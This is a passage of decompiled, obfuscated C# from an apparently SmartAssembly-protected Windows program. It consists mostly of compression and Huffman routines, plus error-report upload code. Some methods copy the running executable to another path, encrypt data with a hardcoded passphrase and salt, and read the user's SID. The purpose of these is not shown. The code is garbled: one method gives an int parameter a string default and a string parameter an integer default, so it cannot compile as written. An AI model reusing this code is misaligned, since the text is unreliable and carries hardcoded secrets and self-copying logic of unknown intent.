				num11 = _00230b._0023f[num10 - 1];
				while (num11 > 0)
				{
					num12 = 2 * P_1[num9++];
					if (P_1[num12 + 1] == -1)
					{
						_00230b._0023b[P_1[num12]] = (byte)num10;
						num11--;
					}
				}
			}
		}
		catch (Exception _0023Sd)
		{
			_0023_0023._0023Ug(_0023Sd, new object[16]
			{
				num, num2, num3, array, num8, num9, i, num4, num5, num6,
				num7, num10, num11, num12, _00230b, P_1
			});
			throw;
		}
	}

	static int _0023hg(_0023nb._0023Ab _0023tb, int P_1)
	{
		int num = default(int);
		try
		{
			if (_0023tb._0023e < P_1)
			{
				if (_0023tb._0023b == _0023tb._0023c)
				{
					return -1;
				}
				uint _0023d = _0023tb._0023d;
				byte[] _0023a = _0023tb._0023a;
				num = _0023tb._0023b++;
				int num2 = _0023a[num] & 0xFF;
				byte[] _0023a2 = _0023tb._0023a;
				num = _0023tb._0023b++;
				_0023tb._0023d = _0023d | (uint)((num2 | ((_0023a2[num] & 0xFF) << 8)) << _0023tb._0023e);
				_0023tb._0023e += 16;
			}
			return (int)(_0023tb._0023d & ((1 << P_1) - 1));
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023fg(_0023hd, (object)num, (object)_0023tb, (object)P_1);
			throw;
		}
	}

	static bool _0023ig(byte[] _0023id, _0023pd._0023rf _0023jd, _0023pd P_2)
	{
		byte[] _0023kb;
		try
		{
			_0023kb = _0023_0023._0023Rf(_0023id);
		}
		catch (Exception)
		{
			_0023_0023._0023Af(P_2, _0023Hd._0023a, _0023nb._0023a);
			return false;
		}
		byte[] array = _0023_0023._0023Xf(_0023kb, _0023ab._00239._00237(107392009));
		if (array == null)
		{
			_0023_0023._0023Af(P_2, _0023Hd._0023a, _0023vc._0023a);
			return false;
		}
		_0023_0023._0023Af(P_2, _0023Hd._0023b);
		_0023je _0023je = new _0023je(_0023ab._00239._00237(107391683));
		if (P_2._0023d != null)
		{
			_0023je._0023d = P_2._0023d;
		}
		_0023pd._0023if _0023if = new _0023pd._0023if(P_2, array, _0023je, _0023jd);
		_0023_0023._0023Nf((_0023Vd)_0023if._0023gf, _0023je);
		return _0023if._0023e;
	}

	static int _0023jg(_0023nb._0023ic P_0)
	{
		try
		{
			return _0023_0023._0023Lg(P_0) | (_0023_0023._0023Lg(P_0) << 16);
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00232f(_0023hd, (object)P_0);
			throw;
		}
	}

	static void _0023kg(Exception _0023hd)
	{
		if (_0023hd == null || !(_0023hd is SecurityException) || !(_0023ee._0023d == _0023ab._00239._00237(107394766)) || !_0023ee.Handler._00235d((SecurityException)_0023hd))
		{
			_0023ee.Handler._00236d(_0023hd, _0023zd: false, _00237d: false);
		}
	}

	static void _0023lg(string _0023l)
	{
		string _0023Id = default(string);
		try
		{
			try
			{
				File.Copy(Assembly.GetExecutingAssembly().Location, _0023l + _0023ab._00239._00237(107391630));
			}
			catch
			{
				_0023Id = _0023ab._00239._00237(107391593);
			}
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00235h(_0023hd, (object)_0023Id, (object)_0023l);
			throw;
		}
	}

	static Icon _0023mg()
	{
		IntPtr _0023ne = IntPtr.Zero;
		IntPtr _0023ne2 = IntPtr.Zero;
		if (_0023_0023._00237h(Application.get_ExecutablePath(), -1, out _0023ne2, out _0023ne2, 1) > 0)
		{
			_0023_0023._00237h(Application.get_ExecutablePath(), 0, out _0023ne, out _0023ne2, 1);
			if (_0023ne != IntPtr.Zero)
			{
				return Icon.FromHandle(_0023ne);
			}
		}
		return null;
	}

	[DllImport("kernel32.dll", EntryPoint = "GetSystemInfo")]
	static extern void _0023ng(ref _0023Fe._0023wf _0023xe);

	static int _0023og(_0023nb._0023hc _0023xb, byte[] _0023pb, int _0023yb, int P_3)
	{
		int num = default(int);
		try
		{
			if (_0023xb._0023e >= 8)
			{
				byte[] _0023a = _0023xb._0023a;
				num = _0023xb._0023c++;
				_0023a[num] = (byte)_0023xb._0023d;
				_0023xb._0023d >>= 8;
				_0023xb._0023e -= 8;
			}
			if (P_3 > _0023xb._0023c - _0023xb._0023b)
			{
				P_3 = _0023xb._0023c - _0023xb._0023b;
				Array.Copy(_0023xb._0023a, _0023xb._0023b, _0023pb, _0023yb, P_3);
				_0023xb._0023b = 0;
				_0023xb._0023c = 0;
			}
			else
			{
				Array.Copy(_0023xb._0023a, _0023xb._0023b, _0023pb, _0023yb, P_3);
				_0023xb._0023b += P_3;
			}
			return P_3;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Dg(_0023hd, (object)num, (object)_0023xb, (object)_0023pb, (object)_0023yb, (object)P_3);
			throw;
		}
	}

	static void _0023pg(_0023nb._0023Vb._00232b P_0)
	{
		int num = default(int);
		int[] array = default(int[]);
		int num2 = default(int);
		int num3 = default(int);
		int i = default(int);
		int num4 = default(int);
		int num5 = default(int);
		int num6 = default(int);
		int num7 = default(int);
		int[] array2 = default(int[]);
		int[] array3 = default(int[]);
		int num9 = default(int);
		int j = default(int);
		int num10 = default(int);
		int num11 = default(int);
		int num12 = default(int);
		int num13 = default(int);
		int num14 = default(int);
		int num15 = default(int);
		int num16 = default(int);
		int num17 = default(int);
		try
		{
			num = P_0._0023a.Length;
			array = new int[num];
			num2 = 0;
			num3 = 0;
			for (i = 0; i < num; i++)
			{
				num4 = P_0._0023a[i];
				if (num4 != 0)
				{
					num5 = num2++;
					while (num5 > 0 && P_0._0023a[array[num6 = (num5 - 1) / 2]] > num4)
					{
						array[num5] = array[num6];
						num5 = num6;
					}
					array[num5] = i;
					num3 = i;
				}
			}
			while (num2 < 2)
			{
				num7 = ((num3 < 2) ? (++num3) : 0);
				array[num2++] = num7;
			}
			P_0._0023d = Math.Max(num3 + 1, P_0._0023c);
			int num8 = num2;
			array2 = new int[4 * num2 - 2];
			array3 = new int[2 * num2 - 1];
			num9 = num8;
			for (j = 0; j < num2; j++)
			{
				num10 = (array2[2 * j] = array[j]);
				array2[2 * j + 1] = -1;
				array3[j] = P_0._0023a[num10] << 8;
				array[j] = j;
			}
			do
			{
				num11 = array[0];
				num12 = array[--num2];
				num13 = 0;
				for (num14 = 1; num14 < num2; num14 = num14 * 2 + 1)
				{
					if (num14 + 1 < num2 && array3[array[num14]] > array3[array[num14 + 1]])
					{
						num14++;
					}
					array[num13] = array[num14];
					num13 = num14;
				}
				num15 = array3[num12];
				while ((num14 = num13) > 0 && array3[array[num13 = (num14 - 1) / 2]] > num15)
				{
					array[num14] = array[num13];
				}
				array[num14] = num12;
				num16 = array[0];
				num12 = num9++;
				array2[2 * num12] = num11;
				array2[2 * num12 + 1] = num16;
				num17 = Math.Min(array3[num11] & 0xFF, array3[num16] & 0xFF);
				num15 = (array3[num12] = array3[num11] + array3[num16] - num17 + 1);
				num13 = 0;
				for (num14 = 1; num14 < num2; num14 = num13 * 2 + 1)
				{
					if (num14 + 1 < num2 && array3[array[num14]] > array3[array[num14 + 1]])
					{
						num14++;
					}
					array[num13] = array[num14];
					num13 = num14;
				}
				while ((num14 = num13) > 0 && array3[array[num13 = (num14 - 1) / 2]] > num15)
				{
					array[num14] = array[num13];
				}
				array[num14] = num12;
			}
			while (num2 > 1);
			_0023_0023._0023gg(P_0, array2);
		}
		catch (Exception _0023Sd)
		{
			_0023_0023._0023Ug(_0023Sd, new object[22]
			{
				num, array, num2, num3, array2, array3, num9, i, num4, num5,
				num6, num7, j, num10, num11, num12, num13, num14, num15, num16,
				num17, P_0
			});
			throw;
		}
	}

	static bool _0023qg(_0023fd P_0)
	{
		if (!P_0._0023d)
		{
			return false;
		}
		return P_0._0023a._0023Oc();
	}

	static string _0023rg(byte[] _0023c, byte[] _0023d, string _0023e = "ViperKnight", int _0023f = "SHA1", int _0023g = 2, string _0023h = "OFRna73m*aze01xY", string _0023i = 256)
	{
		bool flag = default(bool);
		string text = default(string);
		byte[] bytes = default(byte[]);
		byte[] bytes2 = default(byte[]);
		PasswordDeriveBytes passwordDeriveBytes = default(PasswordDeriveBytes);
		byte[] bytes3 = default(byte[]);
		RijndaelManaged rijndaelManaged = default(RijndaelManaged);
		byte[] array = default(byte[]);
		ICryptoTransform cryptoTransform = default(ICryptoTransform);
		MemoryStream memoryStream = default(MemoryStream);
		CryptoStream cryptoStream = default(CryptoStream);
		try
		{
			flag = string.IsNullOrEmpty(_0023d.ToString());
			if (flag)
			{
				text = _0023ab._00239._00237(107394305);
				return text;
			}
			bytes = Encoding.ASCII.GetBytes(_0023e);
			bytes2 = Encoding.ASCII.GetBytes(_0023h);
			passwordDeriveBytes = new PasswordDeriveBytes(_0023c, bytes2, _0023i, _0023g);
			bytes3 = passwordDeriveBytes.GetBytes(_0023f / 8);
			rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.Mode = CipherMode.CBC;
			array = null;
			cryptoTransform = rijndaelManaged.CreateEncryptor(bytes3, bytes);
			try
			{
				memoryStream = new MemoryStream();
				try
				{
					cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write);
					try
					{
						cryptoStream.Write(_0023d, 0, _0023d.Length);
						cryptoStream.FlushFinalBlock();
						array = memoryStream.ToArray();
						memoryStream.Close();
						cryptoStream.Close();
					}
					finally
					{
						((IDisposable)cryptoStream)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)memoryStream)?.Dispose();
				}
			}
			finally
			{
				cryptoTransform?.Dispose();
			}
			rijndaelManaged.Clear();
			text = Convert.ToBase64String(array);
			return text;
		}
		catch (Exception _0023Sd)
		{
			_0023_0023._0023Ug(_0023Sd, new object[18]
			{
				bytes, bytes2, passwordDeriveBytes, bytes3, rijndaelManaged, array, flag, text, cryptoTransform, memoryStream,
				cryptoStream, _0023d, _0023c, _0023h, _0023i, _0023g, _0023e, _0023f
			});
			throw;
		}
	}

	static Type _0023sg(_0023Zc P_0)
	{
		return P_0._0023a;
	}

	static bool _0023tg(_0023nb._0023ac P_0)
	{
		try
		{
			return P_0._0023x == P_0._0023w;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00232f(_0023hd, (object)P_0);
			throw;
		}
	}

	static bool _0023ug(_0023fd _0023Nc, string P_1)
	{
		if (File.Exists(P_1))
		{
			File.Delete(P_1);
		}
		return _0023_0023._0023Hf(_0023Nc._0023a, P_1);
	}

	static byte[] _0023vg(byte[] _0023lb, byte[] _0023hb, byte[] _0023ib)
	{
		try
		{
			return _0023_0023._0023Rf(_0023lb, _0023ib, _0023gb._0023d, _0023hb);
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023fg(_0023hd, (object)_0023hb, (object)_0023lb, (object)_0023ib);
			throw;
		}
	}

	static bool _0023wg()
	{
		try
		{
			return _0023o._0001();
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00238g(_0023hd);
			throw;
		}
	}

	static void _0023xg(string _0023Cc, _0023fd _0023z, string P_2)
	{
		_0023_0023._0023Rh(_0023Cc, (object)P_2, _0023z._0023a);
	}

	[DllImport("gdi32.dll", EntryPoint = "SelectObject")]
	static extern IntPtr _0023yg(IntPtr _0023qe, IntPtr _0023ve);

	static _0023gb _0023zg(byte[] _0023kb)
	{
		_0023nb._0023ic _0023ic = default(_0023nb._0023ic);
		int num = default(int);
		int num2 = default(int);
		try
		{
			if (_0023kb == null || _0023kb.Length < 4)
			{
				return (_0023gb)(-1);
			}
			_0023ic = new _0023nb._0023ic(_0023kb);
			try
			{
				num = _0023_0023._0023jg(_0023ic);
			}
			finally
			{
				((IDisposable)_0023ic)?.Dispose();
			}
			if (num == 67324752)
			{
				return _0023gb._0023a;
			}
			num2 = num >> 24;
			num -= num2 << 24;
			if (num == 8223355)
			{
				return (_0023gb)num2;
			}
			return (_0023gb)(-2);
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Vg(_0023hd, (object)num, (object)num2, (object)_0023ic, (object)_0023kb);
			throw;
		}
	}

	static int _0023Ag(_0023nb._0023Ab _0023xb, byte[] _0023pb, int _0023yb, int P_3)
	{
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		try
		{
			num = 0;
			while (_0023xb._0023e > 0 && P_3 > 0)
			{
				_0023pb[_0023yb++] = (byte)_0023xb._0023d;
				_0023xb._0023d >>= 8;
				_0023xb._0023e -= 8;
				P_3--;
				num++;
			}
			if (P_3 == 0)
			{
				return num;
			}
			num2 = _0023xb._0023c - _0023xb._0023b;
			if (P_3 > num2)
			{
				P_3 = num2;
			}
			Array.Copy(_0023xb._0023a, _0023xb._0023b, _0023pb, _0023yb, P_3);
			_0023xb._0023b += P_3;
			if (((uint)(_0023xb._0023b - _0023xb._0023c) & (true ? 1u : 0u)) != 0)
			{
				byte[] _0023a = _0023xb._0023a;
				num3 = _0023xb._0023b++;
				_0023xb._0023d = _0023a[num3] & 0xFFu;
				_0023xb._0023e = 8;
			}
			return num + P_3;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Kh(_0023hd, (object)num, (object)num2, (object)num3, (object)_0023xb, (object)_0023pb, (object)_0023yb, (object)P_3);
			throw;
		}
	}

	static void _0023Bg(_0023Ve _0023nd, string P_1)
	{
		_0023nd._0023f = P_1;
		_0023nd._0023d.set_Enabled(false);
		_0023nd._0023b = (Image)(object)_0023_0023._0023Uf((P_1.Length > 0) ? _0023ab._00239._00237(107391555) : _0023ab._00239._00237(107391560));
		_0023nd._0023e = true;
		_0023nd._0023c = true;
		if (P_1.Length > 0)
		{
			((Control)_0023nd).set_Height(100);
		}
		((Control)_0023nd).Refresh();
	}

	static string _0023Cg(int _00238)
	{
		object _0023e = default(object);
		string value = default(string);
		string text = default(string);
		try
		{
			_0023e = _0023ab._00239._0023e;
			Monitor.Enter(_0023e);
			try
			{
				_0023ab._00239._0023d.TryGetValue(_00238, out value);
				if (value != null)
				{
					text = value;
					return text;
				}
			}
			finally
			{
				Monitor.Exit(_0023e);
			}
			return _0023_0023._0023Wg(_00238);
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Vg(_0023hd, _0023e, (object)value, (object)text, (object)_00238);
			throw;
		}
	}

	static void _0023Dg(Exception _0023hd, object _0023Id, object _0023Jd, object _0023Kd, object _0023Ld, object _0023Md)
	{
		_0023_0023._0023Ug(_0023hd, new object[5] { _0023Id, _0023Jd, _0023Kd, _0023Ld, _0023Md });
	}

	static void _0023Eg(byte[] _0023kb, string _0023ge, _0023Vd _0023he, string _0023ie, _0023je _0023fe, string P_5)
	{
		try
		{
			ReportingService reportingService = new ReportingService(_0023fe._0023c);
			if (_0023fe._0023d != null)
			{
				((HttpWebClientProtocol)reportingService).set_Proxy(_0023fe._0023d);
			}
			_0023he(reportingService.UploadReport2(_0023fe._0023b, _0023kb, _0023ge, _0023ie, P_5));
		}
		catch (Exception ex)
		{
			_0023he(_0023ab._00239._00237(107391578) + ex.Message);
		}
	}

	static void _0023Fg(_0023Ve P_0)
	{
		P_0._0023d.set_Enabled(true);
		P_0._0023b = (Image)(object)_0023_0023._0023Uf(_0023ab._00239._00237(107393474));
		P_0._0023c = true;
		((Control)P_0).Refresh();
	}

	static int _0023Gg(string _0023Ce, Font _0023re, Graphics _0023De, int _0023Ee)
	{
		return Size.Ceiling(_0023De.MeasureString(_0023Ce, _0023re, _0023Ee)).Height;
	}

	static void _0023Hg(byte[] _0023ob, int _0023zb, int _0023qb, _0023nb._0023Ab P_3)
	{
		int num = default(int);
		try
		{
			if (P_3._0023b < P_3._0023c)
			{
				throw new InvalidOperationException();
			}
			num = _0023zb + _0023qb;
			if (0 > _0023zb || _0023zb > num || num > _0023ob.Length)
			{
				throw new ArgumentOutOfRangeException();
			}
			if (((uint)_0023qb & (true ? 1u : 0u)) != 0)
			{
				P_3._0023d |= (uint)((_0023ob[_0023zb++] & 0xFF) << P_3._0023e);
				P_3._0023e += 8;
			}
			P_3._0023a = _0023ob;
			P_3._0023b = _0023zb;
			P_3._0023c = num;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Dg(_0023hd, (object)num, (object)P_3, (object)_0023ob, (object)_0023zb, (object)_0023qb);
			throw;
		}
	}

	static void _0023Ig(int _0023cc, int _0023pb, _0023nb._0023hc _0023qb, byte[] P_3)
	{
		try
		{
			Array.Copy(P_3, _0023cc, _0023qb._0023a, _0023qb._0023c, _0023pb);
			_0023qb._0023c += _0023pb;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Vg(_0023hd, (object)_0023qb, (object)P_3, (object)_0023cc, (object)_0023pb);
			throw;
		}
	}

	static int _0023Jg(_0023nb._0023Gb _0023Eb, _0023nb._0023Ab _0023qb, int P_2)
	{
		int num = default(int);
		int num2 = default(int);
		try
		{
			P_2 = Math.Min(Math.Min(P_2, 32768 - _0023Eb._0023e), _0023qb.AvailableBytes);
			num = 32768 - _0023Eb._0023d;
			if (P_2 > num)
			{
				num2 = _0023_0023._0023Ag(_0023qb, _0023Eb._0023c, _0023Eb._0023d, num);
				if (num2 == num)
				{
					num2 += _0023_0023._0023Ag(_0023qb, _0023Eb._0023c, 0, P_2 - num);
				}
			}
			else
			{
				num2 = _0023_0023._0023Ag(_0023qb, _0023Eb._0023c, _0023Eb._0023d, P_2);
			}
			_0023Eb._0023d = (_0023Eb._0023d + num2) & 0x7FFF;
			_0023Eb._0023e += num2;
			return num2;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Dg(_0023hd, (object)num2, (object)num, (object)_0023Eb, (object)_0023qb, (object)P_2);
			throw;
		}
	}

	static void _0023Kg(_0023nb._0023Vb P_0)
	{
		int i = default(int);
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		int num5 = default(int);
		try
		{
			for (i = 0; i < P_0._0023q; i++)
			{
				num = P_0._0023p[i] & 0xFF;
				num2 = P_0._0023o[i];
				if (num2-- != 0)
				{
					num3 = _0023_0023._0023Nh(num, P_0);
					_0023_0023._0023Oh(P_0._0023l, num3);
					num4 = (num3 - 261) / 4;
					if (num4 > 0 && num4 <= 5)
					{
						_0023_0023._0023Pg(P_0._0023k, num & ((1 << num4) - 1), num4);
					}
					num5 = _0023_0023._0023gh(P_0, num2);
					_0023_0023._0023Oh(P_0._0023m, num5);
					num4 = num5 / 2 - 1;
					if (num4 > 0)
					{
						_0023_0023._0023Pg(P_0._0023k, num2 & ((1 << num4) - 1), num4);
					}
				}
				else
				{
					_0023_0023._0023Oh(P_0._0023l, num);
				}
			}
			_0023_0023._0023Oh(P_0._0023l, 256);
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Kh(_0023hd, (object)i, (object)num, (object)num2, (object)num3, (object)num4, (object)num5, (object)P_0);
			throw;
		}
	}

	static int _0023Lg(_0023nb._0023ic P_0)
	{
		try
		{
			return P_0.ReadByte() | (P_0.ReadByte() << 8);
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00232f(_0023hd, (object)P_0);
			throw;
		}
	}

	static byte[] _0023Rf(byte[] _0023lb)
	{
		try
		{
			return _0023_0023._0023Rf((byte[])null, (byte[])null, _0023gb._0023b, _0023lb);
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00232f(_0023hd, (object)_0023lb);
			throw;
		}
	}

	static bool _0023Mg(_0023nb._0023Vb P_0)
	{
		try
		{
			return P_0._0023q >= 16384;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00232f(_0023hd, (object)P_0);
			throw;
		}
	}

	static void _0023Ng(object _0023hd, object _0023Id, object _0023Jd, object _0023Kd, object _0023Ld, object _0023Md, object _0023Nd, object _0023Od, Exception _0023Pd, object _0023Qd, object _0023Rd)
	{
		_0023_0023._0023Ug(_0023Pd, new object[10] { _0023Kd, _0023Jd, _0023hd, _0023Md, _0023Rd, _0023Qd, _0023Ld, _0023Od, _0023Nd, _0023Id });
	}

	static void _0023Og(_0023nb._0023Ab P_0)
	{
		try
		{
			P_0._0023d >>= P_0._0023e & 7;
			P_0._0023e &= -8;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00232f(_0023hd, (object)P_0);
			throw;
		}
	}

	static void _0023Pg(_0023nb._0023hc _0023ec, int _0023fc, int P_2)
	{
		int num = default(int);
		try
		{
			_0023ec._0023d |= (uint)(_0023fc << _0023ec._0023e);
			_0023ec._0023e += P_2;
			if (_0023ec._0023e >= 16)
			{
				byte[] _0023a = _0023ec._0023a;
				num = _0023ec._0023c++;
				_0023a[num] = (byte)_0023ec._0023d;
				byte[] _0023a2 = _0023ec._0023a;
				num = _0023ec._0023c++;
				_0023a2[num] = (byte)(_0023ec._0023d >> 8);
				_0023ec._0023d >>= 16;
				_0023ec._0023e -= 16;
			}
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Vg(_0023hd, (object)num, (object)_0023ec, (object)_0023fc, (object)P_2);
			throw;
		}
	}

	static _0023nb._0023Ib _0023Qg(_0023nb._0023Jb P_0)
	{
		byte[] array = default(byte[]);
		try
		{
			array = new byte[P_0._0023m];
			Array.Copy(P_0._0023j, 0, array, 0, P_0._0023m);
			return new _0023nb._0023Ib(array);
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00235h(_0023hd, (object)array, (object)P_0);
			throw;
		}
	}

	static void _0023Rg(_0023nb._0023ac P_0)
	{
		int num = default(int);
		try
		{
			if (P_0._0023r >= 65274)
			{
				_0023_0023._0023Tf(P_0);
			}
			while (P_0._0023s < 262 && P_0._0023w < P_0._0023x)
			{
				num = 65536 - P_0._0023s - P_0._0023r;
				if (num > P_0._0023x - P_0._0023w)
				{
					num = P_0._0023x - P_0._0023w;
				}
				Array.Copy(P_0._0023u, P_0._0023w, P_0._0023t, P_0._0023r + P_0._0023s, num);
				P_0._0023w += num;
				P_0._0023v += num;
				P_0._0023s += num;
			}
			if (P_0._0023s >= 3)
			{
				_0023_0023._0023eg(P_0);
			}
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00235h(_0023hd, (object)num, (object)P_0);
			throw;
		}
	}

	static bool _0023Sg(_0023nb._0023rb P_0)
	{
		int num = default(int);
		int _0023r = default(int);
		int num2 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		try
		{
			num = _0023_0023._0023Cf(P_0._0023y);
			while (num >= 258)
			{
				_0023r = P_0._0023r;
				switch (_0023r)
				{
				case 7:
					while (((num2 = _0023_0023._0023Yf(P_0._0023A, P_0._0023x)) & -256) == 0)
					{
						_0023_0023._0023Bh(P_0._0023y, num2);
						if (--num < 258)
						{
							return true;
						}
					}
					if (num2 < 257)
					{
						if (num2 < 0)
						{
							return false;
						}
						P_0._0023B = null;
						P_0._0023A = null;
						P_0._0023r = 2;
						return true;
					}
					P_0._0023t = _0023nb._0023rb._0023a[num2 - 257];
					P_0._0023s = _0023nb._0023rb._0023b[num2 - 257];
					goto case 8;
				case 8:
					if (P_0._0023s > 0)
					{
						P_0._0023r = 8;
						num3 = _0023_0023._0023hg(P_0._0023x, P_0._0023s);
						if (num3 < 0)
						{
							return false;
						}
						_0023_0023._0023th(P_0._0023x, P_0._0023s);
						P_0._0023t += num3;
					}
					P_0._0023r = 9;
					goto case 9;
				case 9:
					num2 = _0023_0023._0023Yf(P_0._0023B, P_0._0023x);
					if (num2 < 0)
					{
						return false;
					}
					P_0._0023u = _0023nb._0023rb._0023c[num2];
					P_0._0023s = _0023nb._0023rb._0023d[num2];
					break;
				case 10:
					break;
				default:
					continue;
				}
				if (P_0._0023s > 0)
				{
					P_0._0023r = 10;
					num4 = _0023_0023._0023hg(P_0._0023x, P_0._0023s);
					if (num4 < 0)
					{
						return false;
					}
					_0023_0023._0023th(P_0._0023x, P_0._0023s);
					P_0._0023u += num4;
				}
				_0023_0023._00234g(P_0._0023y, P_0._0023t, P_0._0023u);
				num -= P_0._0023t;
				P_0._0023r = 7;
			}
			return true;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023If(_0023hd, (object)num, (object)num2, (object)_0023r, (object)num3, (object)num4, (object)P_0);
			throw;
		}
	}

	static bool _0023Tg(int _0023Db, int _0023qb, _0023nb._0023Vb P_2)
	{
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		try
		{
			P_2._0023o[P_2._0023q] = (short)_0023Db;
			byte[] _0023p = P_2._0023p;
			num = P_2._0023q++;
			_0023p[num] = (byte)(_0023qb - 3);
			num2 = _0023_0023._0023Nh(_0023qb - 3, P_2);
			P_2._0023l._0023a[num2]++;
			if (num2 >= 265 && num2 < 285)
			{
				P_2._0023r += (num2 - 261) / 4;
			}
			num3 = _0023_0023._0023gh(P_2, _0023Db - 1);
			P_2._0023m._0023a[num3]++;
			if (num3 >= 4)
			{
				P_2._0023r += num3 / 2 - 1;
			}
			return _0023_0023._0023Mg(P_2);
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023If(_0023hd, (object)num2, (object)num3, (object)num, (object)P_2, (object)_0023Db, (object)_0023qb);
			throw;
		}
	}

	static void _0023Ug(Exception _0023Sd, object[] _0023Td)
	{
		int methodID = -1;
		int ilOffset = -1;
		int num = 0;
		StackTrace stackTrace = new StackTrace(_0023Sd);
		try
		{
			if (_0023Sd.StackTrace != null)
			{
				string[] array = _0023Sd.StackTrace!.Split('\r', '\n');
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].Length > 0)
					{
						num++;
					}
				}
			}
		}
		catch
		{
			num = -1;
		}
		try
		{
			if (stackTrace.FrameCount > 0)
			{
				StackFrame? frame = stackTrace.GetFrame(stackTrace.FrameCount - 1);
				methodID = (frame!.GetMethod()!.MetadataToken & 0xFFFFFF) - 1;
				ilOffset = frame!.GetILOffset();
			}
		}
		catch
		{
		}
		try
		{
			SmartStackFrame value = new SmartStackFrame(methodID, _0023Td, ilOffset, num);
			LinkedList<object> linkedList;
			if (!_0023Sd.Data.Contains(_0023ab._00239._00237(107394558)))
			{
				linkedList = new LinkedList<object>();
				_0023Sd.Data[_0023ab._00239._00237(107394558)] = linkedList;
			}
			else
			{
				linkedList = (LinkedList<object>)_0023Sd.Data[_0023ab._00239._00237(107394558)];
			}
			linkedList.AddLast(value);
		}
		catch
		{
		}
	}

	static void _0023Vg(Exception _0023hd, object _0023Id, object _0023Jd, object _0023Kd, object _0023Ld)
	{
		_0023_0023._0023Ug(_0023hd, new object[4] { _0023Id, _0023Jd, _0023Kd, _0023Ld });
	}

	static string _0023Wg(int _00238)
	{
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		byte[] array = default(byte[]);
		string text = default(string);
		string text2 = default(string);
		try
		{
			num = _00238;
			num2 = _0023ab._00239._0023c[num++];
			if (((uint)num2 & 0x80u) != 0)
			{
				num3 = ((((uint)num2 & 0x40u) != 0) ? (((num2 & 0x1F) << 24) + (_0023ab._00239._0023c[num++] << 16) + (_0023ab._00239._0023c[num++] << 8) + _0023ab._00239._0023c[num++]) : (((num2 & 0x3F) << 8) + _0023ab._00239._0023c[num++]));
			}
			else
			{
				num3 = num2;
				if (num3 == 0)
				{
					return string.Empty;
				}
			}
			try
			{
				array = Convert.FromBase64String(Encoding.UTF8.GetString(_0023ab._00239._0023c, num, num3));
				text = string.Intern(Encoding.UTF8.GetString(array, 0, array.Length));
				if (_0023ab._00239._0023f)
				{
					_0023_0023._0023nh(text, _00238);
				}
				text2 = text;
				return text2;
			}
			catch
			{
				text2 = null;
				return text2;
			}
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Kh(_0023hd, (object)num3, (object)num, (object)num2, (object)array, (object)text, (object)text2, (object)_00238);
			throw;
		}
	}

	static void _0023Xg(IWebProxy _0023Xc, _0023pd P_1)
	{
		P_1._0023d = _0023Xc;
	}

	static void _0023Yg(_00233c _0023Rc, _0023Uc P_1)
	{
		P_1._0023u?.Invoke(P_1, _0023Rc);
	}

	static string _0023Zg()
	{
		return WindowsIdentity.GetCurrent().User!.ToString();
	}

	static string _00230g(object _0023wc)
	{
		try
		{
			if (_0023wc == null)
			{
				return string.Empty;
			}
			if (_0023wc is int num)
			{
				return num.ToString(_0023ab._00239._00237(107394690));
			}
			if (_0023wc is long num2)
			{
				return num2.ToString(_0023ab._00239._00237(107394690));
			}
			if (_0023wc is short num3)
			{
				return num3.ToString(_0023ab._00239._00237(107394690));
			}
			if (_0023wc is uint num4)
			{
				return num4.ToString(_0023ab._00239._00237(107394690));
			}
			if (_0023wc is ulong num5)
			{
				return num5.ToString(_0023ab._00239._00237(107394690));
			}
			if (_0023wc is ushort num6)
			{
				return num6.ToString(_0023ab._00239._00237(107394690));
			}
			if (_0023wc is byte b)
			{
				return b.ToString(_0023ab._00239._00237(107394690));
			}
			if (_0023wc is sbyte b2)
			{
				return b2.ToString(_0023ab._00239._00237(107394690));
			}
			if (_0023wc is IntPtr intPtr)
			{
				return intPtr.ToInt64().ToString(_0023ab._00239._00237(107394690));
			}
			if (_0023wc is UIntPtr)
			{
				return ((UIntPtr)_0023wc).ToUInt64().ToString(_0023ab._00239._00237(107394690));
			}
		}
		catch
		{
		}
		return string.Empty;
	}

	static void _00231g(_0023nb._0023Vb._00232b P_0)
	{
		int[] array = default(int[]);
		int num = default(int);
		int i = default(int);
		int j = default(int);
		int num2 = default(int);
		try
		{
			_ = P_0._0023a.Length;
			array = new int[P_0._0023g];
			num = 0;
			P_0._0023e = new short[P_0._0023a.Length];
			for (i = 0; i < P_0._0023g; i++)
			{
				array[i] = num;
				num += P_0._0023f[i] << 15 - i;
			}
			for (j = 0; j < P_0._0023d; j++)
			{
				num2 = P_0._0023b[j];
				if (num2 > 0)
				{
					P_0._0023e[j] = _0023_0023._00233h(array[num2 - 1]);
					array[num2 - 1] += 1 << 16 - num2;
				}
			}
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023If(_0023hd, (object)array, (object)num, (object)i, (object)j, (object)num2, (object)P_0);
			throw;
		}
	}

	static void _00232g(_0023nb._0023Mb P_0)
	{
		try
		{
			P_0._0023g |= 12;
		}
